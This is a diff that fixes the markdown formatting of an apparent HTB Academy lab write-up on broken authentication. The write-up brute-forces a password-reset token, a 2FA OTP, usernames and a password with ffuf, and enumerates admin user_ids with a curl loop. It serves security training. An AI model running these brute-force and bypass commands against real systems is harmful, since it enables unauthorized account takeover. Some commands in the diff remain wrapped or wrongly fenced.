@@ -79,7 +79,7 @@ This module explores web application authentication vulnerabilities in detail. W
 #### Technical Methodology & Exploit Execution:
 
 First, lets enter to the target website in the browser:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We get to this login page.
@@ -134,8 +134,8 @@ narrow it down using the password policy in the top of the page:
 The result of which will be outputted to a new wordlist 'custom_wordlist.txt':
 ```bash
 grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep
-```
 '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
+```
 
 ![Figure 3.1 — Lab execution and output verification (Page 3)](/assets/images/posts/htb-academy/broken-authentication/p003_01.jpg)
 *_Figure 3.1 — Lab execution and output verification (Page 3)_*
@@ -209,15 +209,13 @@ sent to the email.
 As we do not have the email – we will proceed to bruteforce the reset PIN,
 using ffuf:
 ```bash
-ffuf -w ./tokens.txt -u http://<target-IP>:<target-
-```
-port>/reset_password.php?token=FUZZ -fr "The provided token
+ffuf -w ./tokens.txt -u http://<target-IP>:<target-port>/reset_password.php?token=FUZZ -fr "The provided token
 is invalid" -s
+```
 
 
 The reset PIN is 1711. Lets reset 'admin's password:
-http://<target-IP>:<target-
-port>/reset_password.php?token=1711
+`http://<target-IP>:<target-port>/reset_password.php?token=1711`
 
 
 And we can reset the admin's password to a password of our choosing.
@@ -281,11 +279,10 @@ We are required to enter 4 digit One-Time Password (OTP).
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-ffuf -w ./tokens.txt -u http://<target-IP>:<target-
-```
-port>/2fa.php -X POST -H "Content-Type: application/x-www-
+ffuf -w ./tokens.txt -u http://<target-IP>:<target-port>/2fa.php -X POST -H "Content-Type: application/x-www-
 form-urlencoded" -b "PHPSESSID=e7gc7pktvnohpu0asrv8slvn70" -
 d "otp=FUZZ" -fr "Invalid 2FA Code" -s
+```
 
 
 *
@@ -405,7 +402,7 @@ Upon entry to the website we get to the usual login page:
 
 
 Lets open the website in burpsuite proxy, interceptor on. And attempt to go to:
-http://<target-IP>:<target-port>/admin.php
+`http://<target-IP>:<target-port>/admin.php`
 
 
 
@@ -469,7 +466,7 @@ Lets hit forward:
 We get user_id 183.
 
 Attempting to go to the URL:
-http://<target-IP>:<target-port>/admin.php?user_id=183
+`http://<target-IP>:<target-port>/admin.php?user_id=183`
 
 
 Will bypass the authentication entirely.
@@ -491,7 +488,7 @@ We will use the bash script:
 #!/bin/bash
 
 # Define the base URL and cookie
-BASE_URL="http://<target-IP>:<target-port>/admin.php"
+BASE_URL="http://`<target-IP>`:`<target-port>`/admin.php"
 
 # Iterate through user_id values from 1 to 200
 for USER_ID in {1..1000}; do
@@ -500,15 +497,15 @@ for USER_ID in {1..1000}; do
 # Send the GET request and capture the response
 RESPONSE=$(curl -s -G "$BASE_URL" \
 --data-urlencode "user_id=$USER_ID" \
--H "Host: <target-IP>:<target-port>")
+-H "Host: `<target-IP>`:`<target-port>`")
 
 # Check if 'admin data' is in the response
 if ! echo "$RESPONSE" | grep -q "admin data"; then
 ```bash
 echo "The string 'admin data' was NOT found for
-```
 user_id: $USER_ID"
 exit 0
+```
 fi
 
 done
@@ -625,12 +622,11 @@ million-usernames.txt'.
 And the request parameters of the login -'username' and password'
 Using ffuf:
 ```bash
-ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-
-```
-usernames.txt -u http://<target-IP>:<target-port>/login.php
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://<target-IP>:<target-port>/login.php
 -X POST -H "Content-Type: application/x-www-form-urlencoded"
 -d "username=FUZZ&password=invalid" -fr "Unknown username or
 password." -s
+```
 
 
 We get a username 'gladys'
@@ -681,11 +677,10 @@ Giving us a list of 17048 values.
 
 We will proceed to use ffuf to bruteforce the password of 'gladys':
 ```bash
-ffuf -w custom_wordlist.txt -u http://<target-IP>:<target-
-```
-port>/login.php -X POST -H "Content-Type: application/x-www-
+ffuf -w custom_wordlist.txt -u http://<target-IP>:<target-port>/login.php -X POST -H "Content-Type: application/x-www-
 form-urlencoded" -d "username=gladys&password=FUZZ" -fr
 "Invalid credentials." -s
+```
 
 
 And we get the password: dWinaldasD13.
